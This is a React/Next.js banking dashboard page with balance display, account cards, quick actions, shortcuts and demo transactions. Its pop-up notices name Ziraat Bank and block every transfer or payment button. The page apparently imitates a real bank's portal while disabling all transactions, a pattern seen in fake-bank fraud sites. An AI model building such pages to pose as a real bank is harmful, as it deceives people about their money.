"use client";

import { useState } from "react";

import {
  Bell,
  ChevronDown,
  ChevronRight,
  CreditCard,
  Eye,
  EyeOff,
  FileText,
  Filter,
  Home,
  Landmark,
  LayoutGrid,
  LogOut,
  Menu,
  MoreHorizontal,
  PiggyBank,
  Plus,
  Search,
  Settings,
  ShieldCheck,
  Smartphone,
  User,
  Wallet,
  X,
} from "lucide-react";
import Image from "next/image";
import { useAuth } from "@/app/context/AuthContext";
import { IoInformationCircleOutline } from "react-icons/io5";
import { DashboardHeader } from "./components/DashboardHeader";
import { MobileNavigation } from "./components/MobileNavigation";
import { Sidebar } from "./components/Sidebar";

/*
|--------------------------------------------------------------------------
| Demo data
|--------------------------------------------------------------------------
*/

const shortcuts = [
  {
    title: "Transfer",
    icon: <Wallet size={20} />,
  },
  {
    title: "Payments",
    icon: <FileText size={20} />,
  },
  {
    title: "Cards",
    icon: <CreditCard size={20} />,
  },
  {
    title: "Accounts",
    icon: <PiggyBank size={20} />,
  },
];

const quickActions = [
  {
    title: "Transfer",
    icon: <Wallet size={22} />,
  },
  {
    title: "Pay Bill",
    icon: <FileText size={22} />,
  },
  {
    title: "Cards",
    icon: <CreditCard size={22} />,
  },
  {
    title: "Top Up",
    icon: <Plus size={22} />,
  },
];


/*
|--------------------------------------------------------------------------
| Welcome section
|--------------------------------------------------------------------------
*/

function WelcomeCard() {

  const { user } = useAuth();

  return (
    <section
      className="
        relative
        overflow-hidden
        rounded-[20px]
        bg-[#e30613]
        px-5
        py-5
        text-white

        sm:px-7
        sm:py-6
      "
    >

      {/* Background decoration */}

      <div
        className="
          pointer-events-none
          absolute
          -right-20
          -top-20
          h-[220px]
          w-[220px]
          rounded-full
          border-[35px]
          border-white/10
        "
      />

      <div
        className="
          relative
          z-10
          flex
          items-center
          justify-between
          gap-5
        "
      >

        <div>

          <p
            className="
              mb-1
              text-[11px]
              font-semibold
              text-white/80
            "
          >
            Welcome back
          </p>

          <h1
            className="
              text-[21px]
              font-extrabold

              sm:text-[25px]
            "
          >
            Hello, {user.fullname}
          </h1>

          <p
            className="
              mt-1
              max-w-[430px]
              text-[12px]
              leading-relaxed
              text-white/85
            "
          >
            Here is an overview of your accounts,
            cards and recent activity.
          </p>

        </div>

        <div
          className="
            hidden
            h-[70px]
            w-[70px]
            items-center
            justify-center
            rounded-full
            bg-white/15
            sm:flex
          "
        >
          <User size={34} />
        </div>

      </div>

    </section>
  );
}

/*
|--------------------------------------------------------------------------
| Account summary
|--------------------------------------------------------------------------
*/

function AccountSummary({
  visible,
  setVisible,
}) {
  const { user } = useAuth();
  return (
    <section
      className="
        rounded-[18px]
        border
        border-gray-200
        bg-white
        p-4
        shadow-sm

        sm:p-5
      "
    >
      <div className="flex items-center justify-between">
        <div>
          <p
            className="
              text-[11px]
              font-semibold
              uppercase
              tracking-wide
              text-gray-400
            "
          >
            Total balance
          </p>

          <div
            className="
              mt-1
              flex
              items-center
              gap-2
            "
          >
            <strong
              className="
                text-[23px]
                font-extrabold
                text-gray-900
              "
            >
              {visible ? `${user.balance.toLocaleString()}.00 USD` : "••••••••"}
            </strong>

            <button
              type="button"
              onClick={() => setVisible(!visible)}
              className="
                text-gray-400
                hover:text-gray-700
              "
            >
              {visible ? <EyeOff size={17} /> : <Eye size={17} />}
            </button>
          </div>
        </div>

        <button
          type="button"
          className="
            flex
            h-9
            w-9
            items-center
            justify-center
            rounded-full
            bg-gray-100
            text-gray-600
          "
        >
          <MoreHorizontal size={19} />
        </button>
      </div>
    </section>
  );
}

/*
|--------------------------------------------------------------------------
| Account card
|--------------------------------------------------------------------------
*/

function AccountCard({
  account,
}) {
  return (
    <article
      className="
        min-w-[260px]
        rounded-[18px]
        bg-[#353f43]
        p-5
        text-white
        shadow-sm

        sm:min-w-0
      "
    >

      <div
        className="
          flex
          items-start
          justify-between
        "
      >

        <div>

          <p className="text-[11px] text-white/60">
            {account.type}
          </p>

          <h3 className="mt-1 text-sm font-bold">
            {account.title}
          </h3>

        </div>

        <Landmark
          size={21}
          className="text-white/70"
        />

      </div>

      <p
        className="
          mt-5
          text-[12px]
          tracking-widest
          text-white/60
        "
      >
        {account.number}
      </p>

      <div className="mt-2">

        <p className="text-[10px] text-white/60">
          Available balance
        </p>

        <strong className="text-[20px]">
          {account.balance.toLocaleString()}{" "}
          {account.currency}
        </strong>

      </div>

      <a
        href="/dashboard/cards"
        className="
          mt-4
          flex
          items-center
          gap-1
          text-[11px]
          font-bold
          text-white
        "
      >
        View account

        <ChevronRight size={14} />
      </a>

    </article>
  );
}

/*
|--------------------------------------------------------------------------
| Quick actions
|--------------------------------------------------------------------------
*/

function QuickActions() {
  const [isToggled, setIsToggled] = useState(false);

  return (
    <section>

      <div
        className="
          mb-3
          flex
          items-center
          justify-between
        "
      >

        <h2 className="text-[15px] font-extrabold">
          Quick actions
        </h2>

        <button
          className="
            text-[11px]
            font-semibold
            text-[#e30613]
          "
        >
          View all
        </button>

      </div>

      <div
        className="
          grid
          grid-cols-4
          gap-2

          sm:gap-3
        "
      >

        {quickActions.map(
          (action) => (
            <button
              key={action.title}
              type="button"
              onClick={() => setIsToggled(true)}
              className="
                flex
                min-h-[75px]
                flex-col
                items-center
                justify-center
                gap-2
                rounded-[15px]
                border
                border-gray-200
                bg-white
                px-2
                text-center
                text-gray-700
                shadow-sm
                transition
                hover:-translate-y-0.5
                hover:border-[#e30613]
              "
            >

              <span
                className="
                  flex
                  h-9
                  w-9
                  items-center
                  justify-center
                  rounded-full
                  bg-red-50
                  text-[#e30613]
                "
              >
                {action.icon}
              </span>

              <span className="text-[10px] font-bold">
                {action.title}
              </span>

            </button>
          )
        )}

      </div>

      {isToggled === true && (
                    <div className="w-full h-full p-10 flex fixed top-0 bottom-0 right-0 left-0 justify-center bg-black/50 items-center loading-modal">
                      <div className="rounded-2xl md:w-96 duration-500 transition-all h-fit w-full  flex flex-col items-center py-5 px-3 dark:bg-isoDark2 bg-white space-y-4">
                        <div className="flex justify-center items-center rounded-full p-2 dark:bg-isoDark bg-[#f4f4f5]">
                          <IoInformationCircleOutline className="w-16 text-black dark:text-isoColor2 h-16" />
                        </div>
            
                        <h1 className="px-6 text-lg font-medium text-center md:font-semibold">
                          Notice!
                        </h1>
            
                        <p className="text-xs text-center">
                          This feature is not yet available for this account. Ziraat Bank operating team will notify you as soon as it becomes functional. Thank you.
                        </p>
            
                        <button
                          type="button"
                          onClick={() => setIsToggled(false)}
                          className="w-full py-3 text-center dark:bg-isoColor2 dark:text-black rounded-xl bg-isoColor1 text-md hover:bg-isoColor2 hover:text-black text-white"
                        >
                          OK
                        </button>
                      </div>
                    </div>
                  )}

    </section>
  );
}

/*
|--------------------------------------------------------------------------
| Shortcuts
|--------------------------------------------------------------------------
*/

function Shortcuts() {
  const [isToggled, setIsToggled] = useState(false);
  return (
    <section>
      <h2
        className="
          mb-3
          text-[15px]
          font-extrabold
        "
      >
        My shortcuts
      </h2>

      <div
        className="
          grid
          grid-cols-4
          gap-2

          sm:grid-cols-4
          sm:gap-3
        "
      >
        {shortcuts.map((shortcut) => (
          <button
            type="button"
            onClick={() => setIsToggled(true)}
            key={shortcut.title}
            className="
                flex
                flex-col
                items-center
                justify-center
                gap-1.5
                rounded-[14px]
                bg-gray-50
                px-2
                py-4
                text-gray-600
                transition
                hover:bg-gray-100
              "
          >
            {shortcut.icon}

            <span className="text-[9px] font-semibold">{shortcut.title}</span>
          </button>
        ))}
      </div>

      {isToggled === true && (
        <div className="w-full h-full p-10 flex fixed top-0 bottom-0 right-0 left-0 justify-center bg-black/50 items-center loading-modal">
          <div className="rounded-2xl md:w-96 duration-500 transition-all h-fit w-full  flex flex-col items-center py-5 px-3 dark:bg-isoDark2 bg-white space-y-4">
            <div className="flex justify-center items-center rounded-full p-2 dark:bg-isoDark bg-[#f4f4f5]">
              <IoInformationCircleOutline className="w-16 text-black dark:text-isoColor2 h-16" />
            </div>

            <h1 className="px-6 text-lg font-medium text-center md:font-semibold">
              Notice!
            </h1>

            <p className="text-xs text-center">
              This feature is not yet available for this account. Ziraat Bank
              operating team will notify you as soon as it becomes functional.
              Thank you.
            </p>

            <button
              type="button"
              onClick={() => setIsToggled(false)}
              className="w-full py-3 text-center dark:bg-isoColor2 dark:text-black rounded-xl bg-isoColor1 text-md hover:bg-isoColor2 hover:text-black text-white"
            >
              OK
            </button>
          </div>
        </div>
      )}
    </section>
  );
}

/*
|--------------------------------------------------------------------------
| Promotional/security card
|--------------------------------------------------------------------------
*/

function SecurityCard() {
  return (
    <section
      className="
        overflow-hidden
        rounded-[18px]
        bg-[#353f43]
        p-5
        text-white
      "
    >

      <div className="flex items-start gap-3">

        <div
          className="
            flex
            h-9
            w-9
            shrink-0
            items-center
            justify-center
            rounded-full
            bg-white/10
          "
        >
          <ShieldCheck size={19} />
        </div>

        <div>

          <h3
            className="
              text-[13px]
              font-extrabold
            "
          >
            Stay secure
          </h3>

          <p
            className="
              mt-1
              text-[11px]
              leading-relaxed
              text-white/70
            "
          >
            Keep your account information private
            and always use the official application
            or website when accessing your account.
          </p>

        </div>

      </div>

      <a
        href="/faq"
        className="
          mt-4
          flex
          items-center
          gap-1
          text-[11px]
          font-bold
        "
      >
        Security center

        <ChevronRight size={14} />
      </a>

    </section>
  );
}

/*
|--------------------------------------------------------------------------
| Recent transactions
|--------------------------------------------------------------------------
*/

function RecentTransactions() {
  const transactions = [
    {
      title: "Card payment",
      description: "Demo Store",
      amount: "-120.00 USD",
      date: "Today",
    },
    {
      title: "Account transfer",
      description: "Savings",
      amount: "+500.00 USD",
      date: "Yesterday",
    },
    {
      title: "Bill payment",
      description: "Utilities",
      amount: "-85.00 USD",
      date: "Yesterday",
    },
  ];

  return (
    <section
      className="
        rounded-[18px]
        border
        border-gray-200
        bg-white
        p-4
        shadow-sm

        sm:p-5
      "
    >

      <div
        className="
          mb-4
          flex
          items-center
          justify-between
        "
      >

        <h2 className="text-[15px] font-extrabold">
          Recent transactions
        </h2>

        <a
          href="/dashboard/transactions-hist"
          className="
            text-[11px]
            font-bold
            text-[#e30613]
          "
        >
          View all
        </a>

      </div>

      <div className="divide-y divide-gray-100">

        {transactions.map(
          (transaction, index) => (
            <div
              key={index}
              className="
                flex
                items-center
                justify-between
                gap-3
                py-3
              "
            >

              <div className="flex items-center gap-3">

                <div
                  className="
                    flex
                    h-9
                    w-9
                    shrink-0
                    items-center
                    justify-center
                    rounded-full
                    bg-gray-100
                    text-gray-600
                  "
                >
                  <CreditCard size={17} />
                </div>

                <div>

                  <p className="text-[12px] font-bold">
                    {transaction.title}
                  </p>

                  <p className="text-[10px] text-gray-400">
                    {transaction.description}
                  </p>

                </div>

              </div>

              <div className="text-right">

                <p
                  className={`
                    text-[12px]
                    font-extrabold

                    ${
                      transaction.amount.startsWith("+")
                        ? "text-green-600"
                        : "text-gray-800"
                    }
                  `}
                >
                  {transaction.amount}
                </p>

                <p className="text-[9px] text-gray-400">
                  {transaction.date}
                </p>

              </div>

            </div>
          )
        )}

      </div>

    </section>
  );
}

/*
|--------------------------------------------------------------------------
| Main dashboard
|--------------------------------------------------------------------------
*/

export default function DashboardPage() {
  const { user } = useAuth();
  const [sidebarOpen, setSidebarOpen] =
    useState(false);

    
    const [balanceVisible, setBalanceVisible] =
    useState(true);

  const accounts = [
    {
      id: 1,
      title: "Savings Account",
      number: `**** ${user.accountNumber.slice(-4)}`,
      balance: user.balance,
      currency: "USD",
      type: "Savings",
    },
    {
      id: 2,
      title: "Current Account",
      number: "**** XXXX",
      balance: "00.00",
      currency: "USD",
      type: "Current",
    },
  ];

  return (
    <main
      className="
        min-h-screen
        bg-[#f5f6f7]
        text-gray-900
      "
    >

      <DashboardHeader
        sidebarOpen={sidebarOpen}
        setSidebarOpen={setSidebarOpen}
      />

      <div
        className="
          mx-auto
          flex
          w-full
          max-w-[1500px]
        "
      >

        {/* Sidebar */}

        <Sidebar
          open={sidebarOpen}
          setOpen={setSidebarOpen}
          tab={'home'}
        />

        {/* =================================================
            CONTENT
        ================================================= */}

        <div
          className="
            min-w-0
            flex-1
            pb-[80px]

            lg:pb-8
          "
        >

          <div
            className="
              mx-auto
              w-full
              max-w-[1200px]
              px-4
              py-4

              sm:px-6
              sm:py-6

              lg:px-8
              lg:py-8
            "
          >

            {/* =============================================
                MOBILE PHONE-LIKE TOP SECTION
            ============================================= */}

            <div
              className="
                mb-4

                sm:mb-6
              "
            >

              <WelcomeCard />

            </div>

            {/* =============================================
                BALANCE
            ============================================= */}

            <div className="mb-4 sm:mb-6">

              <AccountSummary
                visible={balanceVisible}
                setVisible={setBalanceVisible}
              />

            </div>

            {/* =============================================
                ACCOUNT CARDS
            ============================================= */}

            <section className="mb-5 sm:mb-7">

              <div
                className="
                  mb-3
                  flex
                  items-center
                  justify-between
                "
              >

                <h2
                  className="
                    text-[15px]
                    font-extrabold
                  "
                >
                  My accounts
                </h2>

                <a
                  href="/dashboard/cards"
                  className="
                    flex
                    items-center
                    gap-1
                    text-[11px]
                    font-bold
                    text-[#e30613]
                  "
                >
                  All accounts

                  <ChevronRight size={13} />
                </a>

              </div>

              {/* Horizontal scroll on mobile */}

              <div
                className="
                  flex
                  gap-3
                  overflow-x-auto
                  pb-1

                  sm:grid
                  sm:grid-cols-2
                  sm:overflow-visible
                "
              >

                {accounts.map(
                  (account) => (
                    <AccountCard
                      key={account.id}
                      account={account}
                    />
                  )
                )}

              </div>

            </section>

            {/* =============================================
                QUICK ACTIONS
            ============================================= */}

            <div className="mb-5 sm:mb-7">

              <QuickActions />

            </div>

            {/* =============================================
                DESKTOP GRID
            ============================================= */}

            <div
              className="
                grid
                grid-cols-1
                gap-5

                lg:grid-cols-[minmax(0,1fr)_330px]
              "
            >

              {/* LEFT */}

              <div className="space-y-5">

                <Shortcuts />

              </div>

              {/* RIGHT */}

              <div className="space-y-5">

                <SecurityCard />

                {/* Extra desktop panel */}

                <div
                  className="
                    hidden
                    rounded-[18px]
                    border
                    border-gray-200
                    bg-white
                    p-5
                    shadow-sm

                    lg:block
                  "
                >

                  <div className="flex items-center gap-3">

                    <div
                      className="
                        flex
                        h-10
                        w-10
                        items-center
                        justify-center
                        rounded-full
                        bg-red-50
                        text-[#e30613]
                      "
                    >
                      <Smartphone size={20} />
                    </div>

                    <div>

                      <h3
                        className="
                          text-[13px]
                          font-extrabold
                        "
                      >
                        Mobile banking
                      </h3>

                      <p
                        className="
                          mt-1
                          text-[10px]
                          text-gray-400
                        "
                      >
                        Manage your accounts wherever
                        you are.
                      </p>

                    </div>

                  </div>

                  <a
                    href="/"
                    className="
                      mt-4
                      w-full
                      rounded-full
                      bg-[#e30613]
                      py-2.5
                      text-[11px]
                      font-bold
                      text-white
                    "
                  >
                    Learn more
                  </a>

                </div>

              </div>

            </div>

          </div>

        </div>

      </div>

    </main>
  );
}